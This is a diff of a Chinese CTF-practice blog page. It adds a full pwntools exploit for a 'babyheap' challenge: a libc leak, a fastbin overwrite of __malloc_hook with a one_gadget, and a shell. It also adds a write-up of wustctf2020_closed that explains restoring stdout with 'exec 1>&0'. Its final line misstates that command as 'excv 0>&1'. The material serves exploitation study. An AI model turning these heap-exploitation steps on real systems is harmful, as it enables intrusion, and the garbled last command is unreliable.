@@ -41,7 +41,7 @@
 <meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/d43a36d7d80fb61101b0f7366642ac38.png">
 <meta property="og:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/5e0c813b7cfed6c13ca5bb4e792543dd.png">
 <meta property="article:published_time" content="2025-02-19T07:12:47.000Z">
-<meta property="article:modified_time" content="2025-04-28T13:25:42.748Z">
+<meta property="article:modified_time" content="2025-07-07T16:45:56.463Z">
 <meta property="article:author" content="yyf">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://yyyffff.github.io/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1738725643074.png">
@@ -250,7 +250,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          2.3k 字
         
       </span>
     
@@ -261,7 +261,7 @@
         
         
         
-          13 分钟
+          20 分钟
         
       </span>
     
@@ -414,14 +414,160 @@
 <p>此时堆内容</p>
 <p> <img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/5e0c813b7cfed6c13ca5bb4e792543dd.png" srcset="/img/loading.gif" lazyload></p>
 <ul>
-<li>然后就是接收地址和一些地址的计算</li>
+<li>然后就是接收地址和一些地址的计算，gadgets我全写出来了，到时候一个个看看哪个可以</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">unsortedbin_addr=u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <span class="hljs-comment"># 远程的时候发现是7f开头的，所以这里直接这样了</span><br>mainarena_addr=unsortedbin_addr-<span class="hljs-number">0x58</span><br>malloc_hook=mainarena_addr-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>free_hook=libc_base+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsorted bin addr=&quot;</span>,<span class="hljs-built_in">hex</span>(unsortedbin_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base=&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;free_hook=&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;malloc_hook_addr=&quot;</span>,<span class="hljs-built_in">hex</span>(malloc_hook))<br>exceve_addr=[libc_base+<span class="hljs-number">0x45216</span>,libc_base+<span class="hljs-number">0x4526a</span>,libc_base+<span class="hljs-number">0xf02a4</span>,libc_base+<span class="hljs-number">0xf1147</span>]<br></code></pre></td></tr></table></figure>
 
+<ul>
+<li>最后伪造，将1块free掉，利用0块来修改1块的fd，再分配两次从而分配到<code>malloc_hook-0x23</code>上的堆块，进而修改hook为ogg，然后再分配一次，调用到malloc_hook，就是ogg，从而得到shell</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">free(<span class="hljs-number">1</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>alloc(<span class="hljs-number">0x60</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br><br>fill(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x13</span>+p64(libc_base+<span class="hljs-number">0x4526a</span>))<br><br>alloc(<span class="hljs-number">0x10</span>)<br>r.interactive() <br></code></pre></td></tr></table></figure>
+
+
+
 <h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>,timeout=<span class="hljs-number">10</span>)<br><span class="hljs-comment">#r=process(&#x27;./babyheap&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">27749</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">alloc</span>(<span class="hljs-params">size</span>):<br>	r.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>	r.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>	r.recvuntil(<span class="hljs-string">b&quot;Size: &quot;</span>)<br>	r.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fill</span>(<span class="hljs-params">index, content</span>):<br>    r.recvuntil(<span class="hljs-string">b&#x27;Command: &#x27;</span>)<br>    r.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">b&#x27;Index: &#x27;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(index))<br>    r.recvuntil(<span class="hljs-string">b&#x27;Size: &#x27;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    r.recvuntil(<span class="hljs-string">b&#x27;Content: &#x27;</span>)<br>    r.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>): <br>	r.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>	r.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>	r.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>	r.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dump</span>(<span class="hljs-params">index</span>):<br>	r.recvuntil(<span class="hljs-string">b&quot;Command: &quot;</span>)<br>	r.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>	r.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>	r.sendline(<span class="hljs-built_in">str</span>(index))<br><br><br>alloc(<span class="hljs-number">0x10</span>)<br>alloc(<span class="hljs-number">0x40</span>)<br>alloc(<span class="hljs-number">0x100</span>)<br><br>fill(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))<br>fill(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>))<br>free(<span class="hljs-number">1</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br>fill(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x40</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x111</span>))<br>alloc(<span class="hljs-number">0x100</span>)<br>free(<span class="hljs-number">2</span>)<br>dump(<span class="hljs-number">1</span>)<br>ll=r.recv(<span class="hljs-number">0x50</span>+<span class="hljs-number">10</span>)<br>unsortedbin_addr=u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>mainarena_addr=unsortedbin_addr-<span class="hljs-number">0x58</span><br>malloc_hook=mainarena_addr-<span class="hljs-number">0x10</span><br>libc_base=malloc_hook-libc.symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br>free_hook=libc_base+libc.symbols[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;unsorted bin addr=&quot;</span>,<span class="hljs-built_in">hex</span>(unsortedbin_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_base=&quot;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;free_hook=&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;malloc_hook_addr=&quot;</span>,<span class="hljs-built_in">hex</span>(malloc_hook))<br>exceve_addr=[libc_base+<span class="hljs-number">0x45216</span>,libc_base+<span class="hljs-number">0x4526a</span>,libc_base+<span class="hljs-number">0xf02a4</span>,libc_base+<span class="hljs-number">0xf1147</span>]<br><br>free(<span class="hljs-number">1</span>)<br>fill(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x71</span>)+p64(malloc_hook-<span class="hljs-number">0x23</span>))<br>alloc(<span class="hljs-number">0x60</span>)<br>alloc(<span class="hljs-number">0x60</span>)<br><br>fill(<span class="hljs-number">2</span>,<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x13</span>+p64(libc_base+<span class="hljs-number">0x4526a</span>))<br><br>alloc(<span class="hljs-number">0x10</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>
 
+<h1 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a>wustctf2020_closed</h1><p>从来没见过，所以记录下来</p>
+<h2 id="checksec-3"><a href="#checksec-3" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">yyyffff@yyyffff-virtual-machine:~/桌面$</span> <span class="hljs-string">checksec</span> <span class="hljs-string">closed</span><br>[<span class="hljs-string">*</span>] <span class="hljs-string">&#x27;/home/yyyffff/桌面/closed&#x27;</span><br>    <span class="hljs-attr">Arch:</span>       <span class="hljs-string">amd64-64-little</span><br>    <span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x400000)</span><br>    <span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br></code></pre></td></tr></table></figure>
 
+<h2 id="IDA-3"><a href="#IDA-3" class="headerlink" title="IDA"></a>IDA</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  vulnerable();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
 
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">vulnerable</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;HaHaHa!\nWhat else can you do???&quot;</span>);<br>  close(<span class="hljs-number">1</span>);<br>  close(<span class="hljs-number">2</span>);<br>  <span class="hljs-keyword">return</span> shell();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">shell</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>问问AI</p>
+<p>在 Linux 中，每个进程维护一个<strong>文件描述符表</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>FD</th>
+<th>含义</th>
+<th>默认指向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>0</code></td>
+<td>标准输入 stdin</td>
+<td>通常是键盘</td>
+</tr>
+<tr>
+<td><code>1</code></td>
+<td>标准输出 stdout</td>
+<td>通常是终端</td>
+</tr>
+<tr>
+<td><code>2</code></td>
+<td>标准错误 stderr</td>
+<td>通常是终端</td>
+</tr>
+</tbody></table>
+<p>这里close(1)，close(2)相当于关掉了标准输出和标准错误，实际上直接执行程序就得到了shell，不过由于关掉了输出，我们在屏幕上无法看到输出了啥，比如说输入ls，实际上有效果只不过输出被关闭了我们看不到而已</p>
+<p>这里用<code>exec 1&gt;&amp;0</code>来使stdout重新指向</p>
+<h3 id="✅-exec"><a href="#✅-exec" class="headerlink" title="✅ exec"></a>✅ <code>exec</code></h3><p>在 shell 中，<code>exec</code> 有两个常见用途：</p>
+<ol>
+<li><p>替换当前进程：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">exec</span> /bin/sh<br></code></pre></td></tr></table></figure>
+
+<p>→ 当前 shell 被 <code>/bin/sh</code> 替代</p>
+</li>
+<li><p><strong>修改当前 shell 的文件描述符</strong>（本题关键）：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">1</span>&gt;&amp;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+<p>→ 在当前 shell 进程中修改文件描述符指向，不启动新进程。</p>
+</li>
+</ol>
+<hr>
+<h3 id="✅-1-0-是什么格式？"><a href="#✅-1-0-是什么格式？" class="headerlink" title="✅ 1&gt;&amp;0 是什么格式？"></a>✅ <code>1&gt;&amp;0</code> 是什么格式？</h3><p>这是 shell 的<strong>文件描述符重定向语法</strong>：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[目标FD]</span>&gt;<span class="hljs-selector-attr">[&amp;源FD]</span><br></code></pre></td></tr></table></figure>
+
+<p>具体来说：</p>
+<ul>
+<li><code>1</code>：目标文件描述符，<strong>stdout</strong></li>
+<li><code>&gt;</code>：重定向操作</li>
+<li><code>&amp;0</code>：取文件描述符 0（<strong>stdin</strong>）的底层对象</li>
+</ul>
+<p>👉 表示：</p>
+<blockquote>
+<p>把 <code>fd 1</code>（标准输出）<strong>重定向为</strong> <code>fd 0</code>（标准输入）所连接的<strong>对象</strong>。</p>
+</blockquote>
+<hr>
+<h3 id="📌-图示理解"><a href="#📌-图示理解" class="headerlink" title="📌 图示理解"></a>📌 图示理解</h3><p>假设在运行这个命令前，文件描述符状态如下：</p>
+<table>
+<thead>
+<tr>
+<th>文件描述符</th>
+<th>指向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>0</code> (stdin)</td>
+<td>socket（你的 nc &#x2F; pwntools 连接）</td>
+</tr>
+<tr>
+<td><code>1</code> (stdout)</td>
+<td>已被关闭（<code>close(1)</code>）</td>
+</tr>
+</tbody></table>
+<p>运行 <code>exec 1&gt;&amp;0</code> 后变为：</p>
+<table>
+<thead>
+<tr>
+<th>文件描述符</th>
+<th>指向</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>0</code> (stdin)</td>
+<td>socket</td>
+</tr>
+<tr>
+<td><code>1</code> (stdout)</td>
+<td>socket（同 stdin）</td>
+</tr>
+</tbody></table>
+<p>于是你输入的命令，如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> flag<br></code></pre></td></tr></table></figure>
+
+<p>最终内部调用：</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">write</span>(<span class="hljs-params">1, ...</span>)</span>;<br></code></pre></td></tr></table></figure>
+
+<p>就把 flag 的内容写到了 socket 上，你能在客户端看到输出。</p>
+<hr>
+<h3 id="🔁-为什么是“-0”而不是“0”？"><a href="#🔁-为什么是“-0”而不是“0”？" class="headerlink" title="🔁 为什么是“&amp;0”而不是“0”？"></a>🔁 为什么是“&amp;0”而不是“0”？</h3><ul>
+<li><code>&gt;0</code> 表示重定向到文件 <code>&quot;0&quot;</code>（错误❌）</li>
+<li><code>&gt;&amp;0</code> 表示重定向到<strong>文件描述符编号为 0 的打开通道</strong>（正确✅）</li>
+</ul>
+<p>你也可以做：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">exec</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+
+<p>→ 把 stderr（fd 2）也重定向到 stdout（fd 1）。</p>
+<hr>
+<h3 id="✅-总结"><a href="#✅-总结" class="headerlink" title="✅ 总结"></a>✅ 总结</h3><table>
+<thead>
+<tr>
+<th>语法元素</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>exec</code></td>
+<td>修改当前 shell 的 FD 表</td>
+</tr>
+<tr>
+<td><code>1</code></td>
+<td>表示标准输出 fd 1</td>
+</tr>
+<tr>
+<td><code>&gt;&amp;0</code></td>
+<td>把它重定向到 fd 0 所指对象</td>
+</tr>
+<tr>
+<td>结果</td>
+<td>输出通过输入通道走回来（可见性恢复）</td>
+</tr>
+</tbody></table>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>直接<code>r.interactive()</code>后输入<code>excv 0&gt;&amp;1</code>即可<code>cat flag</code></p>
 
                 
               </div>
